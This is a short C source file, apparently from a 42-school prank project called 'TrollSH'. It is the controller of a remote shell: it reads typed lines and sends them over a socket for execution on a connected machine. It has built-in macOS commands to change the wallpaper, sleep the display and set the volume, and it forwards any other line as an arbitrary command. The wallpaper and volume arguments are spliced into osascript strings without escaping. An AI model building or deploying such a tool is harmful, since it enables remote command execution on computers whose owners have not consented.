/* ******************************--------************************************ */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   controller_cmds.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: someone <someone@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/mm/dd hh:mm:ss by someone           #+#    #+#             */
/*   Updated: 2018/mm/dd hh:mm:ss by someone          ###   ########.troll    */
/*                                                                            */
/* ******************************--------************************************ */

#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include "libft.h"
#include "get_next_line.h"

static void		send_cmd(int sockfd, char *line)
{
	char	*cmd;
	char	*chk;

	chk = ft_strchr(line, ' ');
	if (ft_strstart(line, "chgwall"))
	{
		cmd = ft_strdup("osascript -e 'tell application \"System Events\" to ");
		ft_stradd(&cmd, "tell desktop 1 to set picture to ");
		ft_stradd(&cmd, (chk) ? chk + 1 : chk);
		ft_stradd(&cmd, "'");
	}
	else if (ft_strstart(line, "sleepdisp"))
		cmd = ft_strdup("pmset displaysleepnow");
	else if (ft_strstart(line, "setvol"))
	{
		cmd = ft_strdup("osascript -e 'tell application \"System Events\" to ");
		ft_stradd(&cmd, "set volume ");
		ft_stradd(&cmd, (chk) ? chk + 1 : chk);
		ft_stradd(&cmd, "'");
	}
	else
		cmd = line;
	ft_putstr_fd(cmd, sockfd);
	if (cmd && cmd != line)
		free(cmd);
}

int				send_msg(int sockfd)
{
	int					ret;
	char				*msgi;
	char				buffer[32];

	if (recv(sockfd, buffer, sizeof(buffer), MSG_PEEK | MSG_DONTWAIT) == 0)
	{
		ft_putendl_fd("Server kick ya out!", STDERR_FILENO);
		return (FALSE);
	}
	ret = TRUE;
	ft_putstr("\033[1;31mTrollSH\033[0;39m$ ");
	if (get_next_line(STDIN_FILENO, &msgi) > 0)
	{
		if (ft_strcmp(msgi, "exit") == 0)
			ret = FALSE;
		else if (ft_strcmp(msgi, "") == 0)
			ft_putendl_fd("Not a suitable command!", STDERR_FILENO);
		else
			send_cmd(sockfd, msgi);
	}
	else
		ft_putchar('\n');
	ft_strdel(&msgi);
	return (ret);
}
